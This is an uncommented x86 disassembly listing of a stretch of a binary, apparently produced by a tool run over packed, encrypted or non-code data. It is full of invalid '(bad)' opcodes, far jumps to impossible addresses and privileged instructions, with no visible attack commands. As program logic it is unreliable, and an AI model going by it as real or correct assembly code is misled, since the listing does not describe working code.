  414e38:	fisttp DWORD PTR [eax]
  414e3a:	ror    DWORD PTR ds:0x55714c0f,cl
  414e40:	jno    0x414e7f
  414e42:	stos   BYTE PTR es:[edi],al
  414e43:	test   BYTE PTR [edi-0x41],ch
  414e46:	inc    edi
  414e47:	jl     0x414df9
  414e49:	pop    ds
  414e4a:	mov    ah,0xfb
  414e4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e4d:	xchg   BYTE PTR [ebp-0x27],ch
  414e50:	in     al,dx
  414e51:	or     cl,bh
  414e53:	adc    al,0x1
  414e55:	xchg   DWORD PTR [esi-0x25b0fb24],esp
  414e5b:	adc    al,0x8d
  414e5d:	sbb    bl,dh
  414e5f:	sbb    DWORD PTR ds:0x170fd0b7,0xafe97c11
  414e69:	pop    esi
  414e6a:	add    al,0xbc
  414e6c:	mov    edi,0x9d286413
  414e71:	mov    edx,0xb2a690e4
  414e76:	aas    
  414e77:	enter  0xa74e,0x8e
  414e7b:	test   BYTE PTR [ebp+ebx*1+0x25f6d2c4],0x2c
  414e83:	fcmovb st,st(3)
  414e85:	jmp    0xece7:0xc69934b
  414e8c:	outs   dx,BYTE PTR ds:[esi]
  414e8d:	fs adc eax,0xfb6196ef
  414e93:	ds ret 
  414e95:	dec    ecx
  414e96:	and    DWORD PTR [ebx+0x131b2719],ebp
  414e9c:	ror    eax,cl
  414e9e:	push   ebx
  414e9f:	hlt    
  414ea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ea1:	jmp    0x47f20397
  414ea6:	mov    al,0xdd
  414ea8:	add    esi,DWORD PTR [esi-0x7709183c]
  414eae:	(bad)  
  414eb0:	jb     0x414ea0
  414eb2:	jns    0x414f02
  414eb4:	in     al,0x5e
  414eb6:	outs   dx,DWORD PTR ds:[esi]
  414eb7:	hlt    
  414eb8:	jnp    0x414f32
  414eba:	jae    0x414f2c
  414ebc:	mov    al,ds:0xb17341d7
  414ec1:	xchg   edx,eax
  414ec2:	dec    ebp
  414ec3:	inc    edi
  414ec4:	mov    ch,0xf6
  414ec6:	mov    DWORD PTR [ebp-0x739f07e8],eax
  414ecc:	in     al,dx
  414ecd:	jo     0x414e96
  414ecf:	(bad)  
  414ed0:	idiv   BYTE PTR [ecx+0x243f9b11]
  414ed6:	fisubr DWORD PTR [edi]
  414ed8:	cdq    
  414ed9:	fdiv   QWORD PTR [ebp-0xb]
  414edc:	call   0xd1d6585f
  414ee1:	add    dh,BYTE PTR [ebx+0x60]
  414ee4:	fdivp  st(2),st
  414ee6:	xchg   ebx,eax
  414ee7:	and    esi,DWORD PTR [edi-0x3aec549a]
  414eed:	mov    dl,0x22
  414eef:	arpl   dx,sp
  414ef1:	fistp  DWORD PTR [edx+ecx*4-0x7fd0e0cd]
  414ef8:	add    BYTE PTR [edi],0x1
  414efb:	cmp    al,0x29
  414efd:	or     al,0xb
  414eff:	lods   eax,DWORD PTR ds:[esi]
  414f00:	cmp    bh,BYTE PTR ds:0xaf5c0d3e
  414f06:	mov    bl,0x44
  414f08:	into   
  414f09:	in     al,0x95
  414f0b:	in     al,dx
  414f0c:	xor    dh,BYTE PTR [edx+0x60e2]
	...
  414f72:	add    BYTE PTR [eax],al
  414f74:	aaa    
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd08:0x61e31766
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    al,0x1
  414f8a:	add    BYTE PTR [eax],al
  414f8c:	mov    eax,0x873f29f4
  414f91:	dec    esi
  414f92:	in     al,dx
  414f93:	imul   eax,edx,0xffffff9c
  414f96:	inc    ebx
  414f97:	std    
  414f98:	lea    esp,[edx+0x294ab119]
  414f9e:	gs (bad) 
  414fa0:	sub    ch,dh
  414fa2:	add    ebx,DWORD PTR [ebp-0x70b3fa29]
  414fa8:	adc    al,0x84
  414faa:	jno    0x414f7a
  414fac:	das    
  414fad:	nop
  414fae:	popa   
  414faf:	je     0x414f55
  414fb1:	sub    DWORD PTR [edx+ebp*4],edx
  414fb4:	mov    DWORD PTR ds:0x69d5cf33,0xae469ca8
  414fbe:	aas    
  414fbf:	and    esp,edi
  414fc1:	stos   BYTE PTR es:[edi],al
  414fc2:	sub    al,0x7a
  414fc4:	xchg   edx,eax
  414fc5:	adc    ch,BYTE PTR es:[edi-0x7]
  414fc9:	adc    al,0x35
  414fcc:	push   esp
  414fcd:	stos   BYTE PTR es:[edi],al
  414fce:	push   0x3b96462f
  414fd3:	pop    edi
  414fd4:	test   BYTE PTR [ebx+eiz*1+0x34462926],dh
  414fdb:	test   eax,0x66ccfe57
  414fe0:	dec    ebx
  414fe1:	mov    ebp,DWORD PTR [eax+0x10]
  414fe4:	scas   al,BYTE PTR es:[edi]
  414fe5:	or     al,BYTE PTR [ebx-0x5945d03b]
  414feb:	loop   0x415048
  414fed:	sub    al,0x30
  414fef:	icebp  
  414ff0:	push   edx
  414ff1:	mov    ebp,0xca6432e4
  414ff6:	mov    ch,0x99
  414ff8:	jmp    0x31f6327f
  414ffd:	inc    esi
  414ffe:	fisub  DWORD PTR [eax-0x42]
  415001:	fistp  QWORD PTR [ecx-0x63]
  415004:	pop    ds
  415005:	mov    esp,0x35e96e09
  41500a:	push   ds
  41500b:	scas   al,BYTE PTR es:[edi]
  41500c:	fsubp  st(4),st
  41500e:	mov    ch,0x24
  415010:	xor    ebp,ebx
  415012:	and    bh,dl
  415014:	mov    ebx,0xe87e81cb
  415019:	adc    bl,al
  41501b:	loopne 0x41500c
  41501d:	cli    
  41501e:	iret   
  41501f:	inc    esi
  415020:	adc    eax,edi
  415022:	fcomp  DWORD PTR [edx]
  415024:	mov    bx,0xdd0e
  415028:	sub    dh,BYTE PTR [ecx+ebp*1-0x894d6d7]
  41502f:	es push ebp
  415031:	sbb    ah,ah
  415033:	fwait
  415034:	bound  esi,QWORD PTR [esi+ebx*1]
  415037:	mov    ebp,0x1dfe7df5
  41503c:	xor    bl,ch
  41503e:	jmp    0x415098
  415040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415041:	mov    bl,0x6
  415043:	jle    0x41504b
  415045:	mov    bl,0x91
  415047:	fisubr DWORD PTR [edx+0x5ab9c34b]
  41504d:	test   al,0x33
  41504f:	push   ebx
  415050:	icebp  
  415051:	sub    ch,BYTE PTR [ecx]
  415053:	sub    dh,ch
  415055:	fdivr  QWORD PTR [esi+ebp*8-0x8fc8ad1]
  41505c:	jmp    DWORD PTR [esi+edx*4]
  41505f:	push   es
  415060:	fmul   QWORD PTR ds:0xc60a2b62
  415066:	rol    DWORD PTR [eax+0x61cdf0bf],1
  41506c:	jbe    0x41503c
  41506e:	mov    edi,0x410977aa
  415073:	push   ds
  415074:	xchg   edx,eax
  415075:	(bad)  
  415076:	mov    eax,ds:0xc1b0f7c3
  41507b:	adc    edx,ecx
  41507d:	call   0x3d7d6a37
  415082:	imul   edx,DWORD PTR ss:[edx],0x3b
  415086:	xchg   ebx,eax
  415087:	or     edx,ebx
  415089:	xor    eax,0x7fe19ec5
  41508e:	xlat   BYTE PTR ds:[ebx]
  41508f:	stos   DWORD PTR es:[edi],eax
	...
  4150f4:	jnp    0x4150f8
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0x9436fc2d
  415102:	neg    BYTE PTR [ecx]
  415104:	or     al,0xde
  415106:	add    BYTE PTR [eax],al
  415108:	add    al,0x1
  41510a:	add    BYTE PTR [eax],al
  41510c:	call   0x27d1:0xc2d6aa62
  415113:	fidivr WORD PTR [esp+eax*1+0xd]
  415117:	pop    esi
  415118:	adc    dl,BYTE PTR [ebx+edi*8]
  41511b:	js     0x4150a1
  41511d:	inc    ecx
  41511e:	xor    al,BYTE PTR [esi+0xa94fca5]
  415124:	je     0x415159
  415126:	dec    esi
  415127:	mov    ah,0x81
  415129:	pusha  
  41512a:	sub    DWORD PTR fs:[ebp+0x5c],esp
  41512e:	je     0x4151ae
  415130:	mov    ebp,0x8b9362f6
  415135:	out    dx,eax
  415136:	push   0x16e79908
  41513b:	mov    ds:0x7837be1,al
  415140:	mov    bh,0xb7
  415142:	or     DWORD PTR [ebp-0x22f306f5],ebp
  415148:	fidiv  DWORD PTR [edx+0x23b3174c]
  41514e:	push   edi
  41514f:	repnz shr BYTE PTR [esi+0xd31f909],cl
  415156:	add    eax,0x22aaa867
  41515b:	test   al,0x9d
  41515d:	pushf  
  41515e:	popa   
  41515f:	dec    ebx
  415160:	xor    al,0xcc
  415162:	sub    DWORD PTR [ecx-0x5ce3a168],ebx
  415168:	mov    ebx,0x3d8755b2
  41516d:	dec    ebx
  41516e:	dec    ecx
  41516f:	sub    esp,DWORD PTR [esi+0x24]
  415172:	(bad)  
  415173:	cdq    
  415174:	in     eax,dx
  415175:	mov    DWORD PTR [eax],edx
  415177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415178:	(bad)  
  415179:	jecxz  0x4151b0
  41517b:	inc    eax
  41517c:	sub    ebp,0xfffffff8
  41517f:	lahf   
  415180:	mov    ah,0x59
  415182:	iret   
  415183:	mov    dh,0x38
  415185:	or     BYTE PTR [ebp-0x5],bh
  415188:	mov    dl,BYTE PTR [edx+0x78]
  41518b:	mov    edx,0xe183855b
  415190:	data16 (bad) 
  415193:	xor    cl,BYTE PTR [esi+0x58]
  415196:	in     al,0x16
  415198:	enter  0xd5e2,0xed
  41519c:	in     al,dx
  41519d:	ret    0xd326
  4151a0:	loope  0x4151cf
  4151a2:	stos   DWORD PTR es:[edi],eax
  4151a3:	jns    0x4151ff
  4151a5:	nop
  4151a6:	push   cs
  4151a7:	xor    eax,0x7b1cb929
  4151ac:	call   0x27a7ff2e
  4151b1:	mov    ebp,0x472b1145
  4151b6:	push   ebx
  4151b7:	push   eax
  4151b8:	loop   0x4151a4
  4151ba:	mov    cl,0x57
  4151bc:	mov    dh,0xde
  4151be:	pop    edi
  4151bf:	shr    edi,1
  4151c1:	xchg   edx,eax
  4151c2:	ret    0x4da
  4151c5:	mov    bl,0x2
  4151c7:	test   BYTE PTR [ecx-0x4e629af7],0x28
  4151ce:	sub    eax,DWORD PTR [ecx-0x14]
  4151d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151d2:	loop   0x4151f7
  4151d4:	jp     0x4151bf
  4151d6:	pusha  
  4151d7:	xchg   edi,eax
  4151d8:	adc    DWORD PTR [ebp+0x2],eax
  4151db:	jns    0x4151d6
  4151dd:	std    
  4151de:	jae    0x415247
  4151e0:	sbb    BYTE PTR [ebx-0x7a],0xcd
  4151e4:	add    DWORD PTR [ebx-0x39],esi
  4151e7:	mov    edi,0xa22e00bf
  4151ec:	retf   0x737e
  4151ef:	inc    ebp
  4151f0:	cmp    dl,BYTE PTR [edx-0x66870c1]
  4151f6:	xor    edx,DWORD PTR [ebx-0x1e]
  4151f9:	fcomp  st(0)
  4151fb:	dec    eax
  4151fc:	xchg   ecx,eax
  4151fd:	les    esp,FWORD PTR [edi]
  4151ff:	(bad)  
  415200:	sub    BYTE PTR [edi],ch
  415202:	outs   dx,BYTE PTR ds:[esi]
  415203:	mov    eax,ds:0xeffbe501
  415209:	ins    DWORD PTR es:[edi],dx
  41520a:	mov    edx,0xb8e62e1d
  41520f:	stc    
	...
  415274:	sub    al,0x97
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0xab09900b
  415283:	pop    ecx
  415284:	adc    bh,bl
  415286:	add    BYTE PTR [eax],al
  415288:	add    al,0x1
  41528a:	add    BYTE PTR [eax],al
  41528c:	mov    edi,0x8ae4587e
  415291:	test   eax,0xbbf7a258
  415296:	or     BYTE PTR [bx+di+0x33],0xd1
  41529b:	xchg   ebp,eax
  41529c:	sub    DWORD PTR [ecx-0x4568887f],esi
  4152a2:	ins    DWORD PTR es:[edi],dx
  4152a3:	addr16 ja 0x4152ce
  4152a6:	aaa    
  4152a7:	push   ecx
  4152a8:	(bad)  
  4152a9:	mov    cl,0xb9
  4152ab:	mov    eax,0x90be0a56
  4152b0:	jecxz  0x41524f
  4152b2:	sar    DWORD PTR [esi+0x4c],0xb1
  4152b6:	rol    BYTE PTR ds:0x6a23a1df,cl
  4152bc:	out    0x23,eax
  4152be:	mov    eax,0x198b058d
  4152c3:	mov    ds:0xc81c5dca,eax
  4152c8:	mov    esp,0x65c724ad
  4152cd:	xor    al,0x58
  4152cf:	outs   dx,DWORD PTR ds:[esi]
  4152d0:	mov    al,ds:0xa4e96494
  4152d5:	inc    edi
  4152d6:	pop    ds
  4152d7:	(bad)  
  4152d8:	hlt    
  4152d9:	(bad)  
  4152da:	jne    0x415330
  4152dc:	pop    ecx
  4152dd:	pop    ds
  4152de:	pop    ds
  4152df:	loope  0x4152c8
  4152e1:	jnp    0x4152c0
  4152e3:	pop    edi
  4152e4:	push   edx
  4152e5:	pushf  
  4152e6:	pop    ecx
  4152e7:	mov    ds:0x6bb943b3,eax
  4152ec:	adc    eax,edx
  4152ee:	ins    BYTE PTR es:[edi],dx
  4152ef:	xor    al,0xb9
  4152f1:	inc    ebp
  4152f2:	iret   
  4152f3:	inc    esi
  4152f4:	(bad)  
  4152f5:	std    
  4152f6:	xchg   BYTE PTR [edi],ah
  4152f8:	mov    bl,0x4d
  4152fa:	sbb    esi,DWORD PTR [ecx]
  4152fc:	into   
  4152fd:	jle    0x415298
  4152ff:	stos   BYTE PTR es:[edi],al
  415300:	adc    BYTE PTR [ebp+0x53f87d5f],cl
  415306:	test   eax,0x5def9888
  41530b:	inc    ecx
  41530c:	fst    DWORD PTR [edi+0x787d9668]
  415312:	pop    esp
  415313:	adc    al,0xe1
  415315:	das    
  415316:	push   esp
  415317:	cmp    al,0xf1
  415319:	mov    BYTE PTR [ebx],bl
  41531b:	jo     0x415391
  41531d:	(bad)  
  41531f:	jmp    0xe89b:0xd0a1b9cb
  415326:	repnz adc DWORD PTR [ecx+0x75dbd114],0xfffffff9
  41532e:	mov    cl,al
  415330:	cdq    
  415331:	lock loopne 0x415322
  415334:	rcl    BYTE PTR [edi+0x6a],0x9c
  415338:	jle    0x41538b
  41533a:	mov    al,ds:0xf2d3423c
  41533f:	outs   dx,DWORD PTR ds:[esi]
  415340:	test   BYTE PTR [edi-0x4bfe12fd],0xa7
  415347:	cmp    al,0xd0
  415349:	mov    BYTE PTR [eax-0x2eaef97a],dh
  41534f:	pop    ds
  415350:	jno    0x41535c
  415352:	aad    0x8f
  415354:	add    al,0xc5
  415356:	leave  
  415357:	cmp    al,0x76
  415359:	pop    ebx
  41535a:	hlt    
  41535b:	es retf 
  41535d:	fsub   QWORD PTR ds:0xaacff3f2
  415363:	mov    ecx,0xaf880c86
  415368:	out    dx,al
  415369:	scas   al,BYTE PTR es:[edi]
  41536a:	pop    ebx
  41536b:	mov    ah,0x3f
  41536d:	cmp    edi,esp
  41536f:	jmp    FWORD PTR [ebx+0x3e]
  415372:	add    esp,DWORD PTR [ebx]
  415374:	adc    BYTE PTR [eax-0x67721dc9],dh
  41537a:	popa   
  41537b:	in     al,dx
  41537c:	aam    0xa5
  41537e:	xchg   edx,eax
  41537f:	xor    DWORD PTR [ebx+0x401a96f2],edi
  415385:	loopne 0x4153a6
  415387:	dec    eax
  415388:	xlat   BYTE PTR ds:[ebx]
  415389:	jno    0x41532b
  41538b:	cwde   
  41538c:	cmp    eax,0x610642
	...
  4153f1:	add    BYTE PTR [eax],al
  4153f3:	add    BYTE PTR [ebp-0x10],ch
  4153f6:	repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0x73d3e5b0
  415401:	clc    
  415402:	mov    ebp,0xe01401
  415407:	add    BYTE PTR [ecx+eax*1],al
  41540a:	add    BYTE PTR [eax],al
  41540c:	dec    eax
  41540d:	mov    ss,WORD PTR [edx-0x49]
  415410:	leave  
  415411:	test   al,0x44
  415413:	xchg   esp,eax
  415414:	pushf  
  415415:	jecxz  0x4153b4
  415417:	test   dl,bl
  415419:	scas   eax,DWORD PTR es:[edi]
  41541a:	sbb    eax,0xc24673eb
  41541f:	ins    BYTE PTR es:[edi],dx
  415420:	xchg   ecx,eax
  415421:	fisub  WORD PTR [eax]
  415423:	dec    eax
  415424:	pop    ds
  415425:	dec    esp
  415426:	xchg   ecx,eax
  415427:	ror    DWORD PTR [ecx+0x57],1
  41542a:	dec    ebx
  41542b:	jnp    0x415437
  41542d:	fsub   DWORD PTR [ebx+eax*2-0x16dfff92]
  415434:	dec    esi
  415435:	test   eax,0x5b5e6fb4
  41543a:	cmc    
  41543b:	cwde   
  41543c:	mov    es,WORD PTR [edx-0x5d]
  41543f:	and    esi,edi
  415441:	call   0xacc1:0x3c82ab9
  415448:	cmp    bl,BYTE PTR [edi-0x79b3d0f3]
  41544e:	push   0x0
  415450:	sbb    DWORD PTR [eax+0x2255bb19],edi
  415456:	sbb    al,0xb3
  415459:	popa   
  41545a:	mov    DWORD PTR [ecx+0x53],edi
  41545d:	rol    DWORD PTR [edx-0x1e],1
  415460:	push   cs
  415461:	xlat   BYTE PTR ds:[ebx]
  415462:	fistp  WORD PTR [esi-0x4f5772f0]
  415468:	icebp  
  415469:	jmp    0x6a22:0x92e805d7
  415470:	shl    DWORD PTR [edi-0x472b1f56],1
  415476:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415477:	sahf   
  415478:	repnz mov esp,0x9a8be123
  41547e:	jae    0x41548d
  415480:	xor    DWORD PTR [edi],esp
  415482:	sahf   
  415483:	mov    ds:0x1adf0ece,eax
  415488:	sar    BYTE PTR [ebp-0x1b],0xca
  41548c:	dec    esp
  41548d:	xchg   ebx,eax
  41548e:	mov    eax,0x8cdba16d
  415493:	adc    eax,0xdb112346
  415498:	xchg   edi,eax
  415499:	sub    al,0x26
  41549b:	loopne 0x415442
  41549d:	xchg   esp,eax
  41549e:	leave  
  41549f:	cmp    ax,0x4954
  4154a3:	mov    ebx,0xc96c75ad
  4154a8:	clc    
  4154a9:	inc    eax
  4154aa:	inc    edx
  4154ab:	mov    dl,0x87
  4154ad:	mov    bh,BYTE PTR [esi]
  4154af:	xchg   ebx,eax
  4154b0:	test   eax,0x8151c7d7
  4154b5:	int3   
  4154b6:	xor    BYTE PTR [ebp+0x46],0x4e
  4154ba:	aad    0x5
  4154bc:	and    DWORD PTR [esi-0x25],eax
  4154bf:	test   BYTE PTR ds:0xdd1cdfa7,bl
  4154c5:	dec    edx
  4154c6:	pusha  
  4154c7:	adc    eax,0xfb2fd7d5
  4154cc:	repnz arpl dx,cx
  4154cf:	xor    eax,0xb26ac377
  4154d4:	mov    edx,0x7751ffb0
  4154d9:	stos   BYTE PTR es:[edi],al
  4154da:	mov    ebp,ds
  4154dc:	mov    ebp,0xc1f958cf
  4154e1:	xchg   DWORD PTR [edi+0x42],ecx
  4154e4:	push   ecx
  4154e5:	mov    ecx,0x11b3e3ef
  4154ea:	(bad)  
  4154eb:	pop    edi
  4154ec:	sub    ebp,DWORD PTR [edi-0x5e]
  4154ef:	lock and esp,DWORD PTR es:[ecx]
  4154f3:	mov    ?,WORD PTR [ecx+edi*8]
  4154f6:	mov    ebp,0xc2b82d38
  4154fb:	or     al,0x26
  4154fd:	int3   
  4154fe:	mov    bl,0x53
  415500:	lods   eax,DWORD PTR ds:[esi]
  415501:	neg    BYTE PTR [eax+esi*8+0x31378622]
  415508:	xchg   BYTE PTR [eax],ch
  41550a:	(bad)  
  41550c:	lds    edx,FWORD PTR [ebx-0x3d]
  41550f:	daa    
	...
  415574:	in     al,0xf0
  415576:	sub    DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x4155a8
  415581:	scas   eax,DWORD PTR es:[edi]
  415582:	stos   DWORD PTR es:[edi],eax
  415583:	repnz sbb cl,ah
  415586:	add    BYTE PTR [eax],al
  415588:	add    al,0x1
  41558a:	add    BYTE PTR [eax],al
  41558c:	lods   eax,DWORD PTR ds:[esi]
  41558d:	xor    bh,BYTE PTR [ebp+0x205bc971]
  415593:	mov    eax,ds:0xfb42256
  415598:	mov    esi,fs
  41559a:	sub    dh,BYTE PTR [eax-0x1c82922]
  4155a0:	fucom  st(3)
  4155a2:	ja     0x4155a3
  4155a4:	mov    ds:0x68cb1c2e,eax
  4155a9:	lds    edi,FWORD PTR [esi]
  4155ab:	iret   
  4155ac:	ss inc ebp
  4155ae:	out    dx,eax
  4155af:	jno    0x4155a7
  4155b1:	repz mov WORD PTR [edx+ecx*8-0x4c],es
  4155b6:	add    bh,dh
  4155b8:	inc    cx
  4155ba:	repz xor edx,edx
  4155bd:	adc    al,al
  4155bf:	adc    esp,DWORD PTR [edx]
  4155c1:	(bad)  
  4155c2:	retf   0xae9a
  4155c5:	daa    
  4155c6:	fstp   TBYTE PTR [edi-0xb3d030d]
  4155cc:	stos   BYTE PTR es:[edi],al
  4155cd:	ror    DWORD PTR [edx+0x74],cl
  4155d0:	sti    
  4155d1:	mov    eax,0x330ee0ea
  4155d6:	std    
  4155d7:	and    DWORD PTR [ebx+0x53],esp
  4155da:	push   ebx
  4155db:	test   eax,0xc7760442
  4155e0:	aaa    
  4155e1:	dec    esi
  4155e2:	adc    al,0x41
  4155e4:	xchg   ecx,eax
  4155e5:	dec    edi
  4155e6:	(bad)  
  4155e7:	cli    
  4155e8:	dec    ebp
  4155e9:	push   es
  4155ea:	cdq    
  4155eb:	cli    
  4155ec:	xor    ebx,edx
  4155ee:	add    eax,0x21313de6
  4155f3:	test   esp,esi
  4155f5:	dec    esi
  4155f6:	xrelease mov DWORD PTR [ecx],ebx
  4155f9:	cmp    al,ah
  4155fb:	xchg   esi,eax
  4155fc:	mov    al,ds:0x70b62128
  415601:	cdq    
  415602:	mov    bh,0x87
  415604:	dec    esp
  415605:	icebp  
  415606:	mov    dh,0xb3
  415608:	dec    eax
  415609:	sub    al,0x61
  41560b:	push   0x61
  41560d:	pop    ecx
  41560e:	or     DWORD PTR [esi],esi
  415610:	pop    ds
  415611:	and    DWORD PTR [esi+0x5f],0xffffffa6
  415615:	inc    eax
  415616:	and    BYTE PTR ds:[ebx+0x2b],al
  41561a:	dec    esi
  41561b:	push   es
  41561c:	sbb    eax,0xb9e2afca
  415621:	push   esp
  415622:	inc    esi
  415623:	fidiv  DWORD PTR [esp+ebp*8+0x57]
  415627:	(bad)  
  415628:	pop    edi
  415629:	mov    dl,0x37
  41562c:	(bad)  
  41562d:	nop
  41562e:	(bad)  
  41562f:	(bad)  
  415630:	repnz mov BYTE PTR [edx],dl
  415633:	lods   al,BYTE PTR ds:[esi]
  415634:	jmp    ebp
  415636:	ins    BYTE PTR es:[edi],dx
  415637:	inc    ah
  415639:	test   DWORD PTR [ecx-0x70],ecx
  41563c:	adc    ebx,edi
  41563e:	imul   DWORD PTR [eax-0x564e7c95]
  415644:	pop    ecx
  415645:	(bad)  
  415646:	out    dx,eax
  415647:	jnp    0x41562c
  415649:	mov    eax,0x41dba7a
  41564e:	les    ebx,FWORD PTR [edx]
  415650:	or     eax,0x7bc10ee6
  415655:	fwait
  415656:	xor    DWORD PTR [esi+eax*4],esi
  415659:	in     eax,dx
  41565a:	inc    esp
  41565b:	ret    0xb8a6
  41565e:	shl    BYTE PTR [edi+0x57c56005],1
  415664:	stc    
  415665:	xchg   edi,eax
  415666:	push   es
  415667:	scas   eax,DWORD PTR es:[edi]
  415668:	arpl   WORD PTR [ebp-0x74831fa3],ax
  41566e:	xchg   ecx,eax
  41566f:	pop    eax
  415670:	(bad)  
  415671:	clc    
  415672:	xor    BYTE PTR [eax-0x5e],bl
  415675:	push   eax
  415676:	les    edi,FWORD PTR [ebx-0x6688a1a3]
  41567c:	test   DWORD PTR [edx-0x5],ecx
  41567f:	mov    ebx,0x66e8d41
  415684:	jle    0x41565d
  415686:	xchg   ebp,eax
  415687:	loopne 0x415685
  415689:	enter  0x17f8,0x32
  41568d:	push   esi
  41568e:	xchg   ebx,eax
	...
  4156f3:	add    BYTE PTR [ebp-0x66],ch
  4156f6:	mov    esp,0xfd67ff45
  4156fb:	mov    edx,0x2c46bab3
  415700:	add    eax,0x1c31bd55
  415705:	loop   0x415707
  415707:	add    BYTE PTR [ecx+eax*1],al
  41570a:	add    BYTE PTR [eax],al
  41570c:	loope  0x415766
  41570e:	rcr    ebx,1
  415710:	cs pop es
  415712:	(bad)  
  415713:	jno    0x41577a
  415715:	sub    dl,BYTE PTR [esi]
  415717:	std    
  415718:	and    dl,BYTE PTR [edx]
  41571a:	mov    WORD PTR ds:0xd92d2089,es
  415720:	push   esp
  415721:	sbb    DWORD PTR [ebp+0x58],0xffffff9f
  415725:	shl    dl,1
  415727:	stc    
  415728:	popf   
  415729:	jae    0x4157aa
  41572b:	je     0x415765
  41572d:	add    ch,BYTE PTR [esi-0x3a]
  415730:	jmp    0x7e23c76e
  415735:	pop    ecx
  415736:	add    DWORD PTR [ebp-0x1709c4f9],0x9d2b0d3c
  415740:	jecxz  0x415722
  415742:	mov    dh,0x72
  415744:	imul   ebx,esp,0xffffffff
  415747:	fwait
  415748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415749:	mov    WORD PTR [ebx-0x58387dd7],cs
  41574f:	in     eax,dx
  415750:	inc    ecx
  415751:	jecxz  0x4157ce
  415753:	push   esp
  415754:	sbb    ebp,DWORD PTR [edx+0x222a95bf]
  41575a:	ret    
  41575b:	loop   0x415757
  41575d:	dec    eax
  41575e:	sbb    al,0x71
  415760:	add    eax,0xf1ca064b
  415765:	rcl    BYTE PTR [edi],1
  415767:	fdivr  QWORD PTR [ebx+0x4d]
  41576a:	adc    esi,DWORD PTR [eax+0x4e]
  41576d:	jge    0x4157e2
  41576f:	lahf   
  415770:	pop    esp
  415771:	or     eax,0x5e9990a3
  415776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415777:	pop    esp
  415778:	inc    edx
  415779:	sbb    BYTE PTR [esi],ah
  41577b:	loop   0x4157b9
  41577d:	push   edi
  41577e:	rdtsc  
  415780:	ret    0x7112
  415783:	nop
  415784:	mov    cl,0x7
  415786:	test   BYTE PTR [eax],0x64
  415789:	pushf  
  41578a:	hlt    
  41578b:	sub    al,0xf4
  41578d:	hlt    
  41578e:	inc    ecx
  41578f:	cmp    BYTE PTR [ebp+0x3f59c803],al
  415795:	inc    esp
  415796:	xor    bl,BYTE PTR [esi]
  415798:	rol    DWORD PTR [esi-0x3ec71894],0x6b
  41579f:	mov    BYTE PTR [eax-0x769c6858],cl
  4157a5:	pop    ecx
  4157a6:	cmp    DWORD PTR [ebx],ebp
  4157a8:	ja     0x41573c
  4157aa:	mov    bh,0x64
  4157ac:	xor    esp,esi
  4157ae:	jle    0x415741
  4157b0:	out    0x78,al
  4157b2:	dec    ebx
  4157b3:	push   ebx
  4157b4:	test   eax,0xba5a855b
  4157b9:	enter  0x9a23,0x17
  4157bd:	aad    0x1c
  4157bf:	pop    ds
  4157c0:	or     dh,bh
  4157c2:	fmul   st,st(1)
  4157c4:	aad    0xe8
  4157c6:	mov    edi,0x603d3910
  4157cb:	lods   al,BYTE PTR ds:[esi]
  4157cc:	xchg   ebp,eax
  4157cd:	pop    edx
  4157ce:	xor    ebx,ebp
  4157d0:	icebp  
  4157d1:	or     DWORD PTR [esi+0x6d79366e],eax
  4157d7:	jg     0x415858
  4157d9:	retf   
  4157da:	sub    al,BYTE PTR [eax+0x3e]
  4157dd:	sbb    esi,eax
  4157df:	iret   
  4157e0:	imul   esi,DWORD PTR [edx+0x3b],0xc930dc71
  4157e7:	xor    al,0xce
  4157e9:	dec    esi
  4157ea:	push   esi
  4157eb:	mov    DWORD PTR [edi],esp
  4157ed:	cmp    al,0x3c
  4157ef:	out    0x44,eax
  4157f1:	and    BYTE PTR [ecx],cl
  4157f3:	or     ebx,DWORD PTR [ecx-0x74]
  4157f6:	js     0x41577a
  4157f8:	adc    BYTE PTR [ebp+0x7e0af8d1],ah
  4157fe:	aas    
  4157ff:	out    dx,al
  415800:	retf   
  415801:	mov    edx,0xf3b269a8
  415806:	pushf  
  415807:	dec    esi
  415808:	dec    edx
  415809:	arpl   WORD PTR [eax],bx
  41580b:	dec    ebp
  41580c:	jmp    0x415885
  41580e:	ret    
  41580f:	jne    0x415811
	...
  415871:	add    BYTE PTR [eax],al
  415873:	add    bl,cl
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	rcr    DWORD PTR [edi+0x61],cl
  415882:	push   edx
  415883:	repnz and bl,ah
  415886:	add    BYTE PTR [eax],al
  415888:	add    al,0x1
  41588a:	add    BYTE PTR [eax],al
  41588c:	jbe    0x415852
  41588e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41588f:	data16 and bh,BYTE PTR [eax-0x47]
  415893:	and    ecx,DWORD PTR [edx-0x2a7a43c5]
  415899:	mov    edi,0x5657a04e
  41589e:	setae  BYTE PTR [eax-0x64]
  4158a2:	lock retf 0x5053
  4158a6:	test   al,0xb7
  4158a8:	add    ebx,DWORD PTR [ebx+ebp*1]
  4158ab:	popf   
  4158ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158ad:	sbb    eax,0x529f98af
  4158b2:	out    dx,eax
  4158b3:	pop    ebp
  4158b4:	aad    0xb6
  4158b6:	cld    
  4158b7:	mov    bl,0x20
  4158b9:	iret   
  4158ba:	pop    ebx
